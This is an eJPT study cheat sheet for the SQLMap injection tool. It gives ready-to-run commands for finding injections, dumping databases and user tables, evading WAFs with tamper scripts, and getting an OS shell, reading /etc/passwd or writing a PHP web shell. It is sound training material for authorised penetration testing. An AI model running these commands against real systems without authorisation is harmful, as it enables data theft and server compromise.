# SQLMap Cheat Sheet

**SQLMap** is an automated SQL injection detection and exploitation tool that covers the entire attack lifecycle — from confirming an injection point to dumping full databases or landing an OS shell. It's a core tool in eJPT's web application module for turning a suspected injection point into confirmed, actionable data access.

---

## Table of Contents

1. [What SQLMap Automates & When to Reach for It](#1-what-sqlmap-automates--when-to-reach-for-it)
2. [Basic Detection](#2-basic-detection)
3. [Database/Table/Column Enumeration](#3-databasetablecolumn-enumeration)
4. [Advanced Injection Options](#4-advanced-injection-options)
5. [OS Shell & File Access](#5-os-shell--file-access)
6. [Feeding SQLMap a Burp Request](#6-feeding-sqlmap-a-burp-request)
7. [Common Pitfalls](#7-common-pitfalls)
8. [Quick Command Reference](#8-quick-command-reference)

---

## 1. What SQLMap Automates & When to Reach for It

SQLMap takes over everything after you've spotted a *candidate* injection point — it automatically detects the injection type, the backend DBMS, and offers a menu of exploitation paths from there.

- Confirming a parameter is actually injectable (vs. a false lead from manual testing)
- Identifying the injection technique (boolean-blind, error-based, UNION, time-based, stacked queries)
- Fingerprinting the backend DBMS (MySQL, MSSQL, PostgreSQL, Oracle, SQLite...)
- Enumerating and dumping database contents
- Escalating to OS-level file read/write or a full shell where the DB privileges allow it

> Always confirm the injection manually first (e.g. a single `'` causing an error, or `' OR '1'='1` changing the response) before automating — this avoids wasting time running sqlmap against a parameter that was never actually vulnerable.

---

## 2. Basic Detection

The starting point for pointing sqlmap at a target — GET, POST, or cookie-based parameters.

```bash
sqlmap -u "http://target-ip/item.php?id=1"          # Test a GET parameter
sqlmap -u "http://target-ip/login.php" --data="user=admin&pass=test"   # Test POST body params
sqlmap -u "http://target-ip/item.php?id=1" --cookie="PHPSESSID=abc123" # Inject via a cookie value
sqlmap -u "http://target-ip/search.php" --forms      # Auto-detect and test forms on the page
sqlmap -u "http://target-ip/item.php?id=1" --batch   # Accept all default answers, no prompts
```

| Flag | Purpose |
|---|---|
| `-u` | Target URL (with a parameter to test) |
| `--data` | POST body data — sqlmap tests each parameter in it |
| `--cookie` | Test injection through cookie values |
| `--forms` | Auto-discover and test HTML forms on the given page |
| `--batch` | Non-interactive mode — accepts sqlmap's default choice at every prompt |

---

## 3. Database/Table/Column Enumeration

Once injection is confirmed, these flags walk down the database structure step by step.

```bash
sqlmap -u "http://target-ip/item.php?id=1" --dbs                          # List databases
sqlmap -u "http://target-ip/item.php?id=1" -D shop --tables               # List tables in a DB
sqlmap -u "http://target-ip/item.php?id=1" -D shop -T users --columns     # List columns in a table
sqlmap -u "http://target-ip/item.php?id=1" -D shop -T users -C user,pass --dump  # Dump specific columns
sqlmap -u "http://target-ip/item.php?id=1" -D shop -T users --dump        # Dump the whole table
```

| Flag | Purpose |
|---|---|
| `--dbs` | Enumerate available databases |
| `-D <name>` | Select a database |
| `--tables` | Enumerate tables in the selected database |
| `-T <name>` | Select a table |
| `--columns` | Enumerate columns in the selected table |
| `-C <names>` | Select specific columns (comma-separated) |
| `--dump` | Dump the selected data |
| `--dump-all` | Dump everything sqlmap can reach |

---

## 4. Advanced Injection Options

Fine-tuning how aggressively sqlmap tests, and how it dodges filtering/WAFs.

| Flag | Purpose |
|---|---|
| `--technique=BEUSTQ` | Restrict to specific technique(s): Boolean, Error, Union, Stacked, Time, Query-based |
| `--level=1-5` | How many places/tests sqlmap tries (higher = more parameters tested, including headers/cookies) |
| `--risk=1-3` | How risky the payloads are (higher risk = more likely to modify data or cause errors) |
| `--tamper=<script>` | Apply a tamper script to mutate payloads and evade WAF/filtering |
| `--dbms=<name>` | Skip fingerprinting, specify the backend DBMS directly (faster, more reliable) |

```bash
sqlmap -u "http://target-ip/item.php?id=1" --level=5 --risk=3            # Maximum test coverage
sqlmap -u "http://target-ip/item.php?id=1" --technique=T                 # Time-based only (stealthier)
sqlmap -u "http://target-ip/item.php?id=1" --tamper=space2comment --batch  # WAF bypass example
```

> `--tamper` scripts live under sqlmap's `tamper/` directory (e.g. `space2comment`, `charencode`, `randomcase`) — pick one based on the specific WAF/filter behavior observed during manual testing.

---

## 5. OS Shell & File Access

With sufficient database privileges (and depending on DBMS), sqlmap can escalate from data access to file system and command access on the underlying host.

```bash
sqlmap -u "http://target-ip/item.php?id=1" --os-shell                     # Interactive OS command shell
sqlmap -u "http://target-ip/item.php?id=1" --file-read="/etc/passwd"      # Read a file off the server
sqlmap -u "http://target-ip/item.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"  # Write a file
```

> `--os-shell` requires the DB user to have `FILE` privilege (MySQL) or equivalent, and typically requires knowing/guessing the web root path to write an executable payload. This won't work on a locked-down, least-privilege DB account — expect it to fail more often than it succeeds in a hardened environment.

---

## 6. Feeding SQLMap a Burp Request

The most reliable way to hand sqlmap an exact request — headers, cookies, auth tokens and all — captured from real browser traffic through Burp Suite (see `burp-suite-cheatsheet-professional.md`).

```bash
# 1. In Burp Proxy > HTTP History, right-click the request and "Save item" (or copy from Repeater) to request.txt
# 2. Feed the raw request file directly to sqlmap
sqlmap -r request.txt --batch

# Optionally point sqlmap at a specific parameter within that request
sqlmap -r request.txt -p id --batch
```

> This avoids manually reconstructing headers/cookies/CSRF tokens on the command line — especially valuable for POST requests, multi-step logins, or APIs sqlmap's own crawler won't naturally discover.

---

## 7. Common Pitfalls

Mistakes that lead to wasted time or bad conclusions when running sqlmap in practice.

- **False positives on unstable pages** — a page that returns inconsistent content (ads, timestamps, random IDs) can trick boolean/time-based detection into reporting an injection that isn't real. Verify manually.
- **`--batch` silently accepting risky defaults** — it answers every prompt with sqlmap's default, which may skip a technique or a deeper test you actually wanted. Fine for automation, but review the run afterward.
- **Not setting `--level`/`--risk` high enough** — a real but harder-to-trigger injection (e.g. only in a cookie, or only with a boolean-blind technique) can be missed at defaults.
- **Assuming detection = exploitation** — confirming an injection point doesn't guarantee `--dump` or `--os-shell` will succeed; that depends on DB privileges and DBMS features.
- **Skipping manual confirmation first** — running sqlmap against every parameter on a site without a manual lead wastes enormous time and generates excessive, noisy traffic.

---

## 8. Quick Command Reference

A single-page lookup for every command covered above.

| Need | Command |
|---|---|
| Test a GET parameter | `sqlmap -u "http://target-ip/item.php?id=1"` |
| Test a POST body | `sqlmap -u "http://target-ip/login.php" --data="user=admin&pass=test"` |
| Non-interactive run | `sqlmap -u "http://target-ip/item.php?id=1" --batch` |
| List databases | `sqlmap -u "http://target-ip/item.php?id=1" --dbs` |
| List tables | `sqlmap -u "..." -D dbname --tables` |
| Dump a table | `sqlmap -u "..." -D dbname -T tablename --dump` |
| Max coverage | `sqlmap -u "..." --level=5 --risk=3` |
| WAF bypass | `sqlmap -u "..." --tamper=space2comment` |
| OS shell | `sqlmap -u "..." --os-shell` |
| Read a file | `sqlmap -u "..." --file-read="/etc/passwd"` |
| From a Burp-saved request | `sqlmap -r request.txt --batch` |

---

*Prepared as a reference for the eJPT web application module. All techniques should only be used within written authorization (scope/RoE).*
